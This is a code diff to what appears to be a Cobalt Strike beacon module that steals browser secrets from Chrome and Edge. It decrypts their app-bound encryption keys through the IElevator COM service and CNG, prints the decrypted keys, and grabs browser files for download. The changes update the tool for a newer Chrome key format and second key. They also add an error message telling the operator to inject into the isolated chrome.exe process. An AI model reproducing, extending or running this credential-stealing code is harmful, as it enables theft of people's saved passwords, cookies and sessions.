@@ -13,7 +13,7 @@
 #include "beacon.h"
 
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
-WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
@@ -103,6 +103,11 @@ WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);
 #define CSIDL_LOCAL_APPDATA 0x001c
 #define CSIDL_APPDATA 0x001a
 static char* supported_browsers[] = {"chrome", "msedge", "firefox"};
+
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName,
+                    CHAR *folderPath);
+BOOL download_file(IN LPCSTR fileName, IN char fileData[],
+                   IN ULONG32 fileLength);
 
 //workaround for no slot for function (reduce number of Win32 APIs called) 
 // FARPROC Resolver(CHAR *lib, CHAR *func) {
@@ -297,19 +302,23 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     }
     IElevatorChrome* chromeElevator = NULL;
     IElevatorEdge* edgeElevator = NULL;
+    const char *selected_interface = "requested interface";
     // Create an instance of the IElevator COM object
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
         if (FAILED(hr)){
             BeaconPrintf(CALLBACK_ERROR, "[*] CoCreateInstance with Chrome_IID_IElevator2 failed (0x%08X), trying Chrome_IID_IElevator...\n", hr);
             hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &Chrome_IID_IElevator, (void**)&chromeElevator);
+            selected_interface = "IElevatorChrome";
+        } else {
+            selected_interface = "IElevator2Chrome";
         }
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
     }
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance. HRESULT: 0x%08lX\n", (unsigned long)hr);
         OLE32$CoUninitialize();
         return;
     }
@@ -340,7 +349,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     }
 
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket. HRESULT: 0x%08lX\n", (unsigned long)hr);
         OLE32$CoUninitialize();
         return;
     }
@@ -362,10 +371,23 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     //BeaconPrintf(CALLBACK_OUTPUT, "encrypted key length %d\n", encrypted_key_len);
 
     BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
+    if (!ciphertext_data) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] SysAllocStringByteLen failed for %lu ciphertext bytes.\n", (unsigned long)encrypted_key_len);
+        MSVCRT$free(encrypted_key_with_header);
+        MSVCRT$free(encrypted_key);
+        if (chromeElevator) chromeElevator->lpVtbl->Release(chromeElevator);
+        if (edgeElevator) edgeElevator->lpVtbl->Release(edgeElevator);
+        OLE32$CoUninitialize();
+        return;
+    }
     
     //BeaconPrintf(CALLBACK_OUTPUT, "Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
     BSTR plaintext_data = NULL;
     DWORD last_error = ERROR_GEN_FAILURE;
+    BeaconPrintf(CALLBACK_OUTPUT,
+                 "[*] App-bound COM call: interface=%s ciphertext=%lu bytes bstr=%lu bytes\n",
+                 selected_interface, (unsigned long)encrypted_key_len,
+                 (unsigned long)OLEAUT32$SysStringByteLen(ciphertext_data));
     // call com to decrypt key
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
@@ -378,10 +400,24 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
         DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] App-bound COM decryption succeeded: HRESULT=0x%08lX last_error=%lu plaintext=%lu bytes\n",
+                     (unsigned long)hr, (unsigned long)last_error,
+                     (unsigned long)decrypted_size);
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypted App Bound Key: %s\n",
+                     BytesToHexString((const BYTE*)plaintext_data,
+                                      decrypted_size));
 
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[!] App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[!] App Bound Key Decryption failed: HRESULT=0x%08lX last_error=%lu plaintext=%p\n"
+                     "    Note: last_error is the COM service out-parameter and may be stale; HRESULT identifies the failing stage.\n",
+                     (unsigned long)hr, (unsigned long)last_error,
+                     plaintext_data);
+        if (hr == ELEVATOR_E_ISOLATION_STATE_INVALID) {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "[!] Chrome isolation state mismatch. Chrome 157+ bound this key to an isolated caller.\n"
+                         "    Inject into the real chrome.exe process whose command line contains --isolated, not its non-isolated launcher/stub.\n");
+        }
     }
 
     OLEAUT32$SysFreeString(plaintext_data);
@@ -809,7 +845,8 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
 
         // extract type name properly
         UNICODE_STRING *typeStr = &objectTypeInfo->TypeName;
-        WCHAR typeName[256] = {0};
+        WCHAR typeName[256];
+        MSVCRT$memset(typeName, 0, sizeof(typeName));
         int len = min(typeStr->Length / sizeof(WCHAR), 255);
         MSVCRT$wcsncpy(typeName, typeStr->Buffer, len);
         typeName[len] = L'\0'; // null terminated
@@ -1013,7 +1050,8 @@ BOOL PopDWORDFromStringFront(BYTE** data, DWORD* data_len, DWORD* output) {
     return TRUE;
 }
 
-BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_size) {
+BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size,
+                       LPCWSTR key_name, DWORD* output_size) {
     NCRYPT_PROV_HANDLE hProvider = 0;
     NCRYPT_KEY_HANDLE hKey = 0;
     BYTE* output_buffer = NULL;
@@ -1032,7 +1070,6 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     }
     
     // Open key
-    LPCWSTR key_name = L"Google Chromekey1";
     status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenKey failed with status 0x%08X\n", status);
@@ -1340,12 +1377,16 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         // Get key blob
         BYTE* key_blob = cursor;
         
-        // if first byte is 03 then decyrpt with CNG
-        if (key_blob[0] == 0x03) {
+        // Chrome 157 introduced payload flag 0x04 and a second CNG key.
+        if (key_blob[0] == 0x03 || key_blob[0] == 0x04) {
             //BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
             BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
             DWORD cng_out_len = 0;
-            BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
+            LPCWSTR cng_key_name = key_blob[0] == 0x04
+                ? L"Google Chromekey2"
+                : L"Google Chromekey1";
+            BYTE *decrypted = decrypt_with_cng(
+                aes_encrypted_key, 32, cng_key_name, &cng_out_len);
             if (decrypted) {
                 CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
                 //BeaconPrintf(CALLBACK_OUTPUT,"[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
